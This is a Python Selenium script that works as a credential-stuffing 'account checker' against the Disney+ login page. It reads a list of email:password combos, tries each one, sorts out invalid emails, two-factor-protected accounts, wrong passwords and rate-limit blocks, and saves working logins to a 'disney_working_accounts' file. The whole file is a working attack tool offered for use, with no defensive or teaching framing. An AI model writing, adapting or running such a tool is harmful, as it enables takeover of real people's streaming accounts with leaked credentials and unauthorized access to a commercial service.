import time
import os
import requests
from modules.connection_error import connection_error_try_block as connection_error
from bs4 import BeautifulSoup as soup
from headers.disney_header import header
from selenium.common.exceptions import NoSuchElementException, ElementClickInterceptedException, InvalidSessionIdException
from selenium.webdriver.chrome.options import Options
from selenium import webdriver
from pathlib import Path
header()
file_directory = str(Path(__file__).parent)+'/disney'
page = 'https://www.disneyplus.com/login'
users = []
passwords = []
Two_Factor = False
browser_options = Options()
browser_options.add_argument = ('user-agent=Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36')
browser_options.headless = True
os.makedirs('accounts',exist_ok=True)
with open(file_directory, 'r') as disney:
	for line in disney.readlines():
			users.append(line.split(':')[0].strip())
			passwords.append(line.split(':')[1].strip())
index = 0
while index != len(users):
	with open('accounts/disney_working_accounts','a') as account_results:
		try:
			print('\rTrying Combo {} out of {}'.format(index+1, len(users)),end='')
			browser = webdriver.Chrome(options = browser_options)
			browser.set_window_size(500,700)
			browser.get(page)
			time.sleep(7)
			email_input_box = browser.find_element_by_xpath('//*[@id="email"]')
			continue_button = browser.find_element_by_xpath('//*[@id="dssLogin"]/div[2]/button')					
			email_input_box.send_keys(users[index])
			if browser.find_elements_by_xpath('//*[@id="onetrust-reject-all-handler"]'):
				gdpr_reject_all = browser.find_element_by_xpath('//*[@id="onetrust-reject-all-handler"]')
				gdpr_reject_all.click()
			continue_button.click()
			time.sleep(3)
			if browser.find_elements_by_xpath('/html/body/div[3]/div/div/h4'):
				email_error = browser.find_element_by_xpath('/html/body/div[3]/div/div/h4').text
				if "We couldn't find an account for that email" in str(email_error):
					print(' | {}:{} ---> Invalid Email'.format(users[index],passwords[index]))
					error_on_first_page = True
			if browser.find_elements_by_xpath('//*[@id="onboarding_index"]/div/div/form/h3'):
				two_factor_authentication = browser.find_element_by_xpath('//*[@id="onboarding_index"]/div/div/form/h3').text
				if 'Check your email inbox' in str(two_factor_authentication):
					print(" | {}:{} ---> Protected by Two-Factor Authentication".format(users[index],passwords[index]))
					error_on_first_page = True
			if error_on_first_page != True:
				password_input_box = browser.find_element_by_xpath('//*[@id="password"]')
				login_button = browser.find_element_by_xpath('//*[@id="dssLogin"]/div/button')
				password_input_box.send_keys(passwords[index])
				login_button.click()
				time.sleep(5)
				if browser.find_elements_by_xpath('//*[@id="password__error"]'):
					password_or_429_error = browser.find_element_by_xpath('//*[@id="password__error"]').text
					if 'Incorrect Password' in str(password_or_429_error):
						print(" | {}:{} ---> Password is incorrect".format(users[index],passwords[index]))
					if 'Due to' in str(password_or_429_error):
						#print(password_or_429_error)
						print(" | Login Blocked.")
				if browser.find_elements_by_xpath('//*[@id="remove-main-padding_index"]/div/div/section/h2'):
					valid = browser.find_element_by_xpath('//*[@id="remove-main-padding_index"]/div/div/section/h2').text
					if "Who's watching?" in str(valid):
						print(" | {}:{} ---> Success!".format(users[index],passwords[index]))
						account_results.write('{}:{} ---> Good Account\n'.format(users[index],passwords[index]))
			index += 1
			error_on_first_page = False
			browser.close()
		except Exception as e:
			print(e)
			break

